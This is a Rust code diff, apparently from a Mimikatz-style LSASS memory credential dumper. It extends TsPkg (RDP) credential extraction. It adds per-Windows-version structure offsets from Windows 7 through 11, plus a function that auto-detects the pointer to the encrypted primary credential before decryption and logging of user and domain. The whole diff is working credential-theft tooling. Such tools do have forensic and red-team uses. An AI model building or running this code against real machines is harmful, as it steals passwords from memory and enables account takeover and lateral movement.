@@ -5,24 +5,15 @@ use crate::lsass::types::TspkgCredential;
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
-/// TsPkg credential offsets for Windows 10 x64 1607+ (build >= 14394).
-///
-/// KIWI_TS_CREDENTIAL_1607 layout (x64):
-///   +0x00: Flink (LIST_ENTRY.Flink)
-///   +0x08: Blink (LIST_ENTRY.Blink)
-///   +0x10..0x8f: various internal fields
-///   +0x90: pTsPrimary (PTR -> KIWI_TS_PRIMARY_CREDENTIAL)
-///
-/// KIWI_TS_PRIMARY_CREDENTIAL layout:
-///   +0x00: Credentials (UNICODE_STRING - encrypted blob)
-///          The encrypted blob decrypts to:
-///            +0x00: UserName (UNICODE_STRING, offsets relative to blob start)
-///            +0x10: DomainName (UNICODE_STRING)
-///            +0x20: Password (UNICODE_STRING)
-///
+/// TsPkg pTsPrimary offset per Windows version (x64).
 /// TSGlobalCredTable is a PVOID* (pointer to the first linked list entry).
 /// When NULL, no TsPkg credentials exist (common for non-RDP sessions).
-const TSPKG_PTS_PRIMARY_OFFSET: u64 = 0x90;
+const TSPKG_PTS_PRIMARY_OFFSETS: &[u64] = &[
+    0x90, // Win10 1507+ / Win11
+    0x80, // Win8.1
+    0x70, // Win8
+    0x40, // Win7 SP1
+];
 
 /// Extract TsPkg credentials from tspkg.dll.
 ///
@@ -93,9 +84,9 @@ pub fn extract_tspkg_credentials(
         }
         visited.insert(current);
 
-        // Read pTsPrimary pointer
-        let pts_primary = vmem.read_virt_u64(current + TSPKG_PTS_PRIMARY_OFFSET).unwrap_or(0);
-        if pts_primary != 0 && pts_primary > 0x10000 && (pts_primary >> 48) == 0 {
+        // Try each pTsPrimary offset variant
+        let pts_primary = detect_tspkg_primary_ptr(vmem, current);
+        if pts_primary != 0 {
             if let Some(cred) = extract_primary_credential(vmem, keys, pts_primary) {
                 log::info!("TsPkg: user={} domain={}", cred.username, cred.domain);
                 // LUID is not directly accessible from this structure in a reliable way,
@@ -111,6 +102,26 @@ pub fn extract_tspkg_credentials(
     }
 
     Ok(results)
+}
+
+/// Auto-detect the pTsPrimary offset by trying each variant on the entry.
+fn detect_tspkg_primary_ptr(vmem: &impl VirtualMemory, entry: u64) -> u64 {
+    for &offset in TSPKG_PTS_PRIMARY_OFFSETS {
+        let ptr = match vmem.read_virt_u64(entry + offset) {
+            Ok(p) => p,
+            Err(_) => continue,
+        };
+        if ptr > 0x10000 && (ptr >> 48) == 0 {
+            // Validate: the pointed-to structure should have a UNICODE_STRING (Credentials)
+            // with reasonable Length and MaximumLength
+            let len = vmem.read_virt_u16(ptr).unwrap_or(0) as usize;
+            let max_len = vmem.read_virt_u16(ptr + 2).unwrap_or(0) as usize;
+            if len > 0 && len <= 0x400 && max_len >= len {
+                return ptr;
+            }
+        }
+    }
+    0
 }
 
 /// Find TSGlobalCredTable address by scanning LEA instructions near the pattern.
